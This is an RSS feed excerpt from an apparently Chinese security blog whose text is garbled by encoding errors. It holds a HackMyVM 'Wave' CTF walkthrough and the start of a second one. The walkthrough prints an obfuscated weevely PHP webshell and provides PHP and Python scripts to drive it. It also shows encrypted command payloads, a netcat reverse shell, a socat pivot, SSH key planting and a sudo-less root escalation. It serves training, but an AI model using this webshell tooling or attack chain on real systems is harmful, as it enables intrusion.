Kali Linux (XFCE) Á™óÂè£Â§±ÂéªÊéßÂà∂ÊåâÈíÆÂíåÁßªÂä®ËÉΩÂäõÁöÑÈóÆÈ¢òÔºåÈÄöÂ∏∏ÊòØÁî±‰∫éÁ™óÂè£ÁÆ°ÁêÜÂô® `xfwm4` Êú™ËÉΩÊ≠£Â∏∏Â∑•‰ΩúÊâÄËá¥„ÄÇÈÄöËøá `xfwm4 --replace &amp;` ÂëΩ‰ª§ÂèØ‰ª•Á´ãÂç≥‰øÆÂ§çÔºåËÄåÂ∞ÜÂÖ∂Ê∑ªÂä†Âà∞ '‰ºöËØùÂíåÂêØÂä®' ‰∏≠ÂàôÂèØ‰ª•Êèê‰æõ‰∏Ä‰∏™Êõ¥ÊåÅ‰πÖÁöÑËß£ÂÜ≥ÊñπÊ°àÔºåÁ°Æ‰øùÁî®Êà∑‰ΩìÈ™åÁöÑËøûÁª≠ÊÄß„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Kali%20Linux%20-zheng-jiu-ji-hua-%EF%BC%9A-xiu-fu-chuang-kou-wu-fa-yi-dong-ji-kong-zhi-an-niu-xiao-shi-wen-ti.html</guid><pubDate>Fri, 27 Jun 2025 09:33:43 +0000</pubDate></item><item><title>hmv_Wave</title><link>https://7r1UMPHK.github.io/post/hmv_Wave.html</link><description># hmv_Wave

# 0.ÁÆÄ‰ªã

**Èù∂Êú∫**Ôºö[hackmyvm - Wave](https://hackmyvm.eu/machines/machine.php?vm=Wave)
**ÈöæÂ∫¶**ÔºöÈªÑËâ≤
**ÁõÆÊ†á IP**Ôºö192.168.205.138
**Êú¨Êú∫ IP**Ôºö192.168.205.141

# 1.Êâ´Êèè

`nmap`Ëµ∑Êâã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-18 18:30 CST
Nmap scan report for 192.168.205.138
Host is up (0.00029s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5555/tcp open  freeciv
MAC Address: 08:00:27:37:83:76 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.58 seconds
```

Âéª80ÁúãÁúãwebÈ°µÈù¢

# 2.Ë∏©ÁÇπ

![Image](https://github.com/user-attachments/assets/fc213d31-5792-4ec3-bc4f-f8ddc75839bb)

ÁàÜÁ†¥ÁõÆÂΩï

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ feroxbuster -u 'http://192.168.205.138/' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md 
                                                                                                                                  
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben 'epi' Risher ü§ì                 ver: 2.11.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://192.168.205.138/
 üöÄ  Threads               ‚îÇ 50
 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 üëå  Status Codes          ‚îÇ All Status Codes!
 üí•  Timeout (secs)        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.11.0
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üîé  Extract Links         ‚îÇ true
 üí≤  Extensions            ‚îÇ [php, html, txt, md]
 üèÅ  HTTP methods          ‚îÇ [GET]
 üîÉ  Recursion Depth       ‚îÇ 4
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                 
200      GET        3l        5w       32c http://192.168.205.138/backup/phptest.bck
200      GET        3l        6w       31c http://192.168.205.138/backup/index.bck
200      GET        2l        1w        4c http://192.168.205.138/backup/log.log
200      GET        1l        2w       18c http://192.168.205.138/backup/robots.bck
200      GET        2l       13w      833c http://192.168.205.138/backup/weevely.bck
200      GET        3l        6w       31c http://192.168.205.138/
301      GET        7l       11w      169c http://192.168.205.138/backup =&gt; http://192.168.205.138/backup/
200      GET        3l        6w       31c http://192.168.205.138/index.html
200      GET        1l        2w       18c http://192.168.205.138/robots.txt
200      GET        1l        2w       11c http://192.168.205.138/phptest.php
[####################] - 48s   311445/311445  0s      found:10      errors:0    
[####################] - 47s   311410/311410  6566/s  http://192.168.205.138/ 
[####################] - 0s    311410/311410  77852500/s http://192.168.205.138/backup/ =&gt; Directory listing (add --scan-dir-listings to scan)                           
```

Êé¢Á¥¢‰∏Ä‰∏ã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.138/backup/phptest.bck
&lt;?php
print ('HELLO WORLD');
?&gt;
                                                                                                                                
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.138/backup/index.bck  
&lt;h1&gt; WAVE &lt;/h1&gt;

&lt;!-- wAvE --&gt;
                                                                                                                                
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.138/backup/log.log  
OK

                                                                                                                                
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.138/backup/robots.bck
Disallow: /backup
                                                                                                                                
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.138/backup/weevely.bck
Warning: Binary output can mess up your terminal. Use '--output -' to tell curl to output it to your terminal anyway, or consider 
Warning: '--output &lt;FILE&gt;' to save to a file.
```

ÊâæÂà∞‰∫Ü‰∏Ä‰∏™Êñá‰ª∂ÔºåÊàë‰ª¨‰∏ãËΩΩ‰∏ãÊù•ÁúãÁúã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.138/backup/weevely.bck -o /tmp/weevely.bck
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   515  100   515    0     0   217k      0 --:--:-- --:--:-- --:--:--  251k
                                                                                                                                
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cd tmp                                                      
                                                                                                                                                                                                                                              
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ cat weevely.bck                
&lt;?php include '\160\x68\141\x72\72\57\57'.basename(__FILE__).'\57\x78';__HALT_COMPILER(); ?&gt;/xÔøΩXÔøΩÔøΩÔøΩUÔøΩÔøΩjÔøΩ0≈øÔøΩ)JÔøΩhBÔøΩS;ÔøΩÔøΩÔøΩ
                                                                                                                      ÔøΩ/ÔøΩJÔøΩÔøΩ‚ñímÔøΩ.ÔøΩÔøΩ)ÔøΩÔøΩnÔøΩ(‚ñíÔøΩÔøΩ'`ÔøΩ=6ÔøΩ&amp;TÔøΩYEÔøΩpÔøΩÔøΩ(ÔøΩq1ÔøΩÔøΩÔøΩa'HÔøΩPq6ÔøΩ.ÔøΩÔøΩÔøΩvÔøΩÔøΩÔøΩ/ÔøΩÔøΩ8ÔøΩƒ≥eÔøΩÔøΩ$+ÔøΩÔøΩsÔøΩ'ÔøΩÔøΩÔøΩÔøΩ5ÔøΩ|ÔøΩÔøΩHÔøΩÔøΩ OÔøΩÔøΩÔøΩÔøΩwÔøΩ2%ÔøΩÔøΩOyTVÔøΩÔøΩÔøΩQÔøΩbÔøΩAÔøΩÔøΩÔøΩhÔøΩÔøΩ=ÔøΩW {ÔøΩÔøΩ
ÔøΩk–õw8ÔøΩaÔøΩÔøΩÔøΩÔøΩSÔøΩÔøΩÔøΩÔøΩÔøΩ
ÔøΩfBLXx  ÔøΩÔøΩÔøΩœúÔøΩÔøΩÔøΩÔøΩvÔøΩÔøΩÔøΩÔøΩmÔøΩÔøΩÔøΩ%#,HÔøΩÔøΩR#2HJ]ÔøΩtÔøΩ|*ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩhÔøΩMsÔøΩÔøΩ
                       ⁄ñ&amp;'ÔøΩÔøΩYÔøΩÔøΩÔøΩPÔøΩÔøΩBÔøΩÔøΩlXwÔøΩlÔøΩeÔøΩÔøΩÔøΩE!SÔøΩHeÔøΩ2ÔøΩpÔøΩ7GÔøΩ[NÔøΩÔøΩ=ÔøΩ-ÔøΩÔøΩ…ÉÔøΩiÔøΩ)ÔøΩ[ÔøΩÔøΩNÔøΩÔøΩÔøΩÔøΩ7ÔøΩÔøΩU_ÔøΩ=*ÔøΩÔøΩŒ®ÔøΩs?c((VGBMB                                                                                                                                

```

ÈÉ®ÂàÜÂÜÖÂÆπÊòæÁ§∫‰π±Á†ÅÔºå‰ΩÜÊòØÊàë‰ª¨ÈÄöËøáÂèØËØªÁöÑÂèØ‰ª•ÂæóÁü•ÔºåÂèØËÉΩÊòØ‰∏Ä‰∏™ÊÅ∂ÊÑèÂêéÈó®ÔºåÊàë‰ª¨Â∞ùËØïÊÅ¢Â§ç‰∏Ä‰∏ã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ file weevely.bck
weevely.bck: PHP phar archive with SHA1 signature
                                                                                                                                
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ phar extract -f weevely.bck weevely.phpr
//home/kali/test/tmp/weevely.bck/x ...ok
                                                                                                                                                                                                                                           
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ cat /home/kali/test/tmp/weevely.phpr/home/kali/test/tmp/weevely.bck/x 
&lt;?php eval('$k='3ddf0d5c';$kh='b6e7a529b6c2';$kf='d598a771749b';$p='afnqDsRcBpVmU71y';

function x($t,$k){
$c=strlen($k);$l=strlen($t);$o='';
for($i=0;$i&lt;$l;){
for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)
{
$o.=$t[$i]^$k[$j];
}
}
return $o;
}
if (@preg_match('/$kh(.+)$kf/',@file_get_contents('php://input'),$m)==1) {
@ob_start();
@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
$o=@ob_get_contents();
@ob_end_clean();
$r=@base64_encode(@x(@gzcompress($o),$k));
print('$p$kh$r$kf');
}');                                                                                                                                
```

Á°ÆÂÆûÊòØ**Webshell ÂêéÈó®**ÔºåÊàë‰ª¨Â∞ùËØïÂà©Áî®‰∏Ä‰∏ã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/kali/test/tmp/weevely.bck]
‚îî‚îÄ$ cat tool.php 
&lt;?php
$k = '3ddf0d5c';  // ÂØÜÈí•

function x($t, $k)
{
    $c = strlen($k);  // ÂØÜÈí•ÈïøÂ∫¶
    $l = strlen($t);  // ÊñáÊú¨ÈïøÂ∫¶
    $o = '';

    // XOR Âä†ÂØÜ/Ëß£ÂØÜ
    for ($i = 0; $i &lt; $l;)
    {
        for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++)
        {
            $o .= chr(ord($t[$i]) ^ ord($k[$j]));
        }
    }
    return $o;
}

echo 'ÈÄâÊã©Êìç‰ΩúÔºö\n';
echo '1. Âä†ÂØÜ\n';
echo '2. Ëß£ÂØÜ\n';
$choice = trim(fgets(STDIN));  // Ëé∑ÂèñÁî®Êà∑ËæìÂÖ•

echo 'ËØ∑ËæìÂÖ•ÊñáÊú¨Ôºö\n';
$input_text = trim(fgets(STDIN));  // Ëé∑ÂèñË¶ÅÂä†ÂØÜ/Ëß£ÂØÜÁöÑÊñáÊú¨

if ($choice == 1) {
    // Âä†ÂØÜ
    echo 'Âä†ÂØÜÂâçÁöÑÊñáÊú¨: ' . $input_text . '\n';

    // ÂéãÁº©ÊñáÊú¨
    $compressed_text = gzcompress($input_text);  // ÂéãÁº©ÊñáÊú¨
    $encrypted_text = x($compressed_text, $k);   // XOR Âä†ÂØÜ
    echo 'Âä†ÂØÜÂêéÁöÑÊñáÊú¨: ' . base64_encode($encrypted_text) . '\n';  // ËæìÂá∫ Base64 ÁºñÁ†ÅÂêéÁöÑÂä†ÂØÜÊñáÊú¨
} elseif ($choice == 2) {
    // Ëß£ÂØÜ
    $decoded_text = base64_decode($input_text);  // Base64 Ëß£Á†Å
    $decrypted_text = x($decoded_text, $k);      // XOR Ëß£ÂØÜ
  
    // Ëß£ÂéãÁº©
    $decompressed = @gzuncompress($decrypted_text);  // Ëß£ÂéãÁº©Ôºå‰ΩøÁî® @ ÈÅøÂÖçË≠¶Âëä
  
    // Â¶ÇÊûúËß£ÂéãÊàêÂäüÔºåÂàôËæìÂá∫Ëß£ÂéãÂêéÁöÑÂÜÖÂÆπÔºõÂê¶ÂàôËæìÂá∫Ëß£ÂØÜÂêéÁöÑÂÜÖÂÆπ
    if ($decompressed !== false) {
        echo 'Ëß£ÂØÜÂπ∂Ëß£ÂéãÂêéÁöÑÊñáÊú¨: ' . $decompressed . '\n';
    } else {
        echo 'Ëß£ÂØÜÂêéÁöÑÊñáÊú¨: ' . $decrypted_text . '\n';
    }
} else {
    echo 'Êó†ÊïàÁöÑÈÄâÈ°π\n';
}
?&gt;
```

Âä†ÂØÜÂíåËß£ÂØÜÊ®°ÂùóÔºàËß£ÂØÜÊ®°ÂùóÊòØ‰π±Á†ÅÔºåÂª∫ËÆÆ‰∏çÁî®ÔºåÊàñËÄÖËá™Â∑±ÊîπÔºâ„ÄÇÂèëÈÄÅÊ®°ÂùóÊàë‰ª¨ËøòÂ∑Æ‰∏Ä‰∏™ÁΩëÂùÄÔºåÊàë‰ª¨‰πãÂâçÁî®ÈÇ£‰∏™ÊòØÂ§á‰ªΩÊñá‰ª∂ÔºåÊàë‰ª¨Áü•ÈÅìÂÆÉÁöÑÂëΩÂêçËßÑÂàôÔºåÈÇ£Êàë‰ª¨Â∞ùËØïÁàÜÁ†¥

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ wfuzz -c -u 'http://192.168.205.138/weevelyFUZZ' -w /usr/share/seclists/Discovery/Web-Content/web-extensions-big.txt --hc 404   
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.138/weevelyFUZZ
Total requests: 66885

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000037:   200        0 L      0 W        0 Ch        '.php7'                                                             
000000248:   404        7 L      11 W       153 Ch      '.lOg'                                                              

Total time: 2.123899
Processed Requests: 246
Filtered Requests: 245
Requests/sec.: 115.8246


```

Ê†πÊçÆÂ∑≤Áü•‰ø°ÊÅØÁºñÂÜôËÑöÊú¨

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/kali/test/tmp/weevely.bck]
‚îî‚îÄ$ cat request.py 
import requests
import base64

# ÂØÜÈí• (‰∏é PHP ËÑöÊú¨‰∏≠ÁöÑÂØÜÈí•‰∏ÄËá¥)
kh = 'b6e7a529b6c2'
kf = 'd598a771749b'
p = 'afnqDsRcBpVmU71y'

def main():
    # ËæìÂÖ•Ë¶ÅÂèëÈÄÅÁöÑÂ≠óÁ¨¶‰∏≤
    input_data = input('Enter the string to send: ')

    # ÊûÑÈÄ†Â∏¶ÊúâÁºñÁ†ÅÊï∞ÊçÆÁöÑËØ∑Ê±Ç‰Ωì
    request_data = f'{kh}{input_data}{kf}'

    url = 'http://192.168.205.138/weevely.php7'  # ËØ∑Ê†πÊçÆÂÆûÈôÖÊÉÖÂÜµ‰øÆÊîπ

    # ÂèëÈÄÅ POST ËØ∑Ê±Ç
    response = requests.post(url, data=request_data)

    # ÊâìÂç∞ÂìçÂ∫îÊä•Êñá
    print('Response:', response.text)

if __name__ == '__main__':
    main()

```

ÂèëÈÄÅÊ®°Âùó„ÄÇÊàë‰ª¨Â∞ùËØï‰∏Ä‰∏ã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/kali/test/tmp/weevely.bck]
‚îî‚îÄ$ php tool.php
ÈÄâÊã©Êìç‰ΩúÔºö
1. Âä†ÂØÜ
2. Ëß£ÂØÜ
1
ËØ∑ËæìÂÖ•ÊñáÊú¨Ôºö
system('ping -c2 192.168.205.141');
Âä†ÂØÜÂâçÁöÑÊñáÊú¨: system('ping -c2 192.168.205.141');
Âä†ÂØÜÂêéÁöÑÊñáÊú¨: S/hPyBxKfK7mNE6u/C9is35SNlaEUOdQB9e0VQJU4FAHVTC0hGI1ozptfA==

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/kali/test/tmp/weevely.bck]
‚îî‚îÄ$ python3 request.py
Enter the string to send: S/hPyBxKfK7mNE6u/C9is35SNlaEUOdQB9e0VQJU4FAHVTC0hGI1ozptfA==
Response: afnqDsRcBpVmU71yb6e7a529b6c2S/jp6f3u9yMj4Isfut49aVWaVqAvrEySgZxiVBbHOVl6KFMHTZ944ZQclbQEIWC05MOHiT+Q62uui+A3K8WYpUFCyNb58w7Y8YGh+OA4ZFpFRq2La91DLq87XUak1QjwTHJ+qr8GRRC72jSkqEkXHi5T197tvwT9lw2e5+7iz2VRo+VepOD08CvQytpLQkWEWe7lv2cPLReNkMV5R9FNGMMM7LBjd4Gx6rS3VxPib9nNQsedo9XHXjkoCy4V1mmqug38XPsihxwXSDrMd598a771749b
                                      
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ sudo tcpdump -A -n icmp
[sudo] kali ÁöÑÂØÜÁ†ÅÔºö
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
19:22:08.263760 IP 192.168.205.138 &gt; 192.168.205.141: ICMP echo request, id 58412, seq 1, length 64
E..T..@.@..Z...........c.,.....g....p....................... !'#$%&amp;'()*+,-./01234567
19:22:08.263782 IP 192.168.205.141 &gt; 192.168.205.138: ICMP echo reply, id 58412, seq 1, length 64
E..T....@.\F...........c.,.....g....p....................... !'#$%&amp;'()*+,-./01234567
19:22:09.276459 IP 192.168.205.138 &gt; 192.168.205.141: ICMP echo request, id 58412, seq 2, length 64
E..T.(@.@..............1.,.....g............................ !'#$%&amp;'()*+,-./01234567

```

ËøêË°åÊ≠£Â∏∏ÔºåÊàë‰ª¨Âºπshell

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/kali/test/tmp/weevely.bck]
‚îî‚îÄ$ python3 request.py
Enter the string to send: S/hPyBxKfK7mNK4tZlSBV+FXUNXgVwdT5ldQV2TUNWE2uTBjzcD5X87AoIQ8QXgIM1fValA=

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 8888             
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.138] 58888
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 3. Ëé∑ÂæóÁ®≥ÂÆöÁöÑ Shell

Ëé∑Âèñ**ÂèçÂêë shell** ÂêéÔºåÈÄöËøá‰ª•‰∏ãÂëΩ‰ª§Ëé∑ÂæóÁ®≥ÂÆöÁöÑ**‰∫§‰∫íÂºè** **TTY shell**Ôºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.ÊèêÊùÉ

```bash
www-data@wave:~/html$ sudo -l  
[sudo] password for www-data: 
sudo: a password is required
www-data@wave:~/html$ ls -la
total 32
drwxr-xr-x 3 www-data www-data 4096 Sep  5  2023 .
drwxr-xr-x 3 root     root     4096 Sep  4  2023 ..
drwxr-xr-x 2 www-data www-data 4096 Sep  5  2023 backup
-rw-r--r-- 1 www-data www-data   31 Sep  4  2023 index.html
-rw-r--r-- 1 www-data www-data   32 Sep  4  2023 phptest.php
-rw-r--r-- 1 www-data www-data   18 Sep  4  2023 robots.txt
-rw-r--r-- 1 root     root      515 Sep  5  2023 weevely.bck
-rw-r--r-- 1 www-data www-data  515 Sep  5  2023 weevely.php7
www-data@wave:~/html$ cd /home/
www-data@wave:/home$ ls -al
total 16
drwxr-xr-x  4 root  root  4096 Sep  4  2023 .
drwxr-xr-x 18 root  root  4096 Sep  4  2023 ..
drwx------  4 angie angie 4096 Jan 18 10:40 angie
drwx------  2 carla carla 4096 Sep  4  2023 carla
www-data@wave:/home$ cd /opt/
www-data@wave:/opt$ ls -al
total 12
drwxr-xr-x  2 root root  4096 Sep  4  2023 .
drwxr-xr-x 18 root root  4096 Sep  4  2023 ..
-rwxrwxr--  1 root carla   46 Sep  4  2023 secret.txt
www-data@wave:/opt$ cat secret.txt 
Dietro di lui, 
dietro di lui solo la nebbia.
www-data@wave:/opt$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/mount
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/su
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/newgrp
www-data@wave:/opt$ /sbin/getcap -r / 2&gt;/dev/null
/usr/bin/ping cap_net_raw=ep
www-data@wave:/opt$ ss -tuln | grep tcp
tcp   LISTEN 0      1024       127.0.0.1:3923      0.0.0.0:*            
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*    
tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*    
tcp   LISTEN 0      128             [::]:22           [::]:*    
tcp   LISTEN 0      511             [::]:80           [::]:*   
```

Êúâ‰∏™Êú™Áü•Á´ØÂè£ÔºåÊàë‰ª¨ËΩ¨Âèë‰∏Ä‰∏ã

```bash
www-data@wave:~/html$ cd /tmp/
www-data@wave:/tmp$ wget 192.168.205.141/socat
--2025-01-18 13:20:09--  http://192.168.205.141/socat
Connecting to 192.168.205.141:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 375176 (366K) [application/octet-stream]
Saving to: 'socat'

socat                                                        0%[                                                                       socat                                                      100%[========================================================================================================================================&gt;] 366.38K  --.-KB/s    in 0.003s  

2025-01-18 13:20:09 (105 MB/s) - 'socat' saved [375176/375176]

www-data@wave:/tmp$ chmod +x socat 
www-data@wave:/tmp$ ./socat TCP-LISTEN:1234,fork TCP4:127.0.0.1:3923 &amp;
[1] 592
```

![Image](https://github.com/user-attachments/assets/74b5fd1f-838c-462a-acb9-576e7a15086e)

ÂÉè‰∏™Êñá‰ª∂ÁÆ°ÁêÜÂô®ÔºåËÄå‰∏îÁúãÊ†∑Â≠êÂÆÉËøòÊòØÂú®ÂÆ∂ÁõÆÂΩï‰∏ãÔºåÊàë‰ª¨Â∞ùËØï‰∏ä‰º†‰∏Ä‰∏™ÂØÜÈí•‰∏äÂéªÁúãÁúãËÉΩ‰∏çËÉΩ‰∏ÄÂèëÂÖ•È≠Ç

```bash
mkdir .ssh
cd .ssh
ssh-keygen -t rsa 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): id_rsa
Enter passphrase (empty for no passphrase): 123456
Enter same passphrase again: 123456

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/.ssh]
‚îî‚îÄ$ ls -al
ÊÄªËÆ° 20
drwxrwxr-x  3 kali kali 4096  1Êúà18Êó• 20:34 .
drwxrwxr-x 10 kali kali 4096  1Êúà18Êó• 20:31 ..
-rw-r--r--  1 kali kali  563  1Êúà18Êó• 17:40 authorized_keys
-rw-------  1 kali kali 2635  1Êúà18Êó• 17:40 id_rsa
drwxrwxr-x  2 kali kali 4096  1Êúà18Êó• 20:35 .ssh


‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/.ssh]
‚îî‚îÄ$ ls -la .ssh/              
ÊÄªËÆ° 12
drwxrwxr-x 2 kali kali 4096  1Êúà18Êó• 20:35 .
drwxrwxr-x 3 kali kali 4096  1Êúà18Êó• 20:34 ..
-rw-r--r-- 1 kali kali  563  1Êúà18Êó• 17:40 authorized_keys
                                                            
```

ËÆ∞ÂæóÂú®ÈáåÈù¢ÂÜçÂàõÂª∫‰∏Ä‰∏™`.ssh`Êñá‰ª∂Â§πÔºåÂπ∂‰∏îÊää`id\_rsa.pub`ÊîπÂêç‰∏∫`authorized_keys`ÔºåÁÑ∂ÂêéÊâìÂºÄ‰Ω†ÁöÑÊñá‰ª∂ÁÆ°ÁêÜÂô®Êää`.ssh`ÔºàÂè™Êúâ`authorized_keys`ÈÇ£‰∏™ÔºâÊñá‰ª∂Â§π**ÊãñËøõÂéª‰∏ä‰º†**

![Image](https://github.com/user-attachments/assets/a896ce7c-321b-4eb0-a253-bef4e2a7d01a)

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/.ssh]
‚îî‚îÄ$ ssh angie@192.168.205.138 -i id_rsa
The authenticity of host '192.168.205.138 (192.168.205.138)' can't be established.
ED25519 key fingerprint is SHA256:6XC0N82ZtO32MzrvGO7WaR/Yg+rpDa0Wkgoy3H8IdnE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.138' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Linux wave 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Sep  5 11:14:50 2023 from 192.168.0.100
angie@wave:~$ id
uid=1000(angie) gid=1000(angie) grupos=1000(angie),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)

```

Â∞ùËØïÊèêÊùÉ

```bash
angie@wave:~$ sudo -l
Matching Defaults entries for angie on wave:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User angie may run the following commands on wave:
    (ALL) NOPASSWD: /usr/bin/less -F /opt/secret.txt
angie@wave:~$ sudo /usr/bin/less -F /opt/secret.txt
Dietro di lui, 
dietro di lui solo la nebbia.

```

Â∞èÁ™óÊèêÊùÉÔºü

![Image](https://github.com/user-attachments/assets/f85836de-c61b-43be-9851-7a6fb509c529)

ËøòÁúüÊòØ

```bash
root@wave:/home/angie# id
uid=0(root) gid=0(root) grupos=0(root)

```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Wave.html</guid><pubDate>Fri, 27 Jun 2025 09:33:39 +0000</pubDate></item><item><title>hmv_qweasd</title><link>https://7r1UMPHK.github.io/post/hmv_qweasd.html</link><description># hmv_qweasd

**Èù∂Êú∫**Ôºöhttps://hackmyvm.eu/machines/machine.php?vm=Qweasd
**ÈöæÂ∫¶**ÔºöÈªÑËâ≤
**ÁõÆÊ†á IP**Ôºö192.168.205.217
**Êú¨Êú∫** IPÔºö192.168.205.141

---

## **1. Á´ØÂè£Êûö‰∏æÂèäÊúçÂä°Êé¢Êµã**

È¶ñÂÖàÔºå‰ΩøÁî® `nmap` Êâ´ÊèèÁõÆÊ†á IP ÁöÑÂºÄÊîæÁ´ØÂè£Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sV -sT -O -Pn -n -p- 192.168.205.217
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-31 11:35 CST
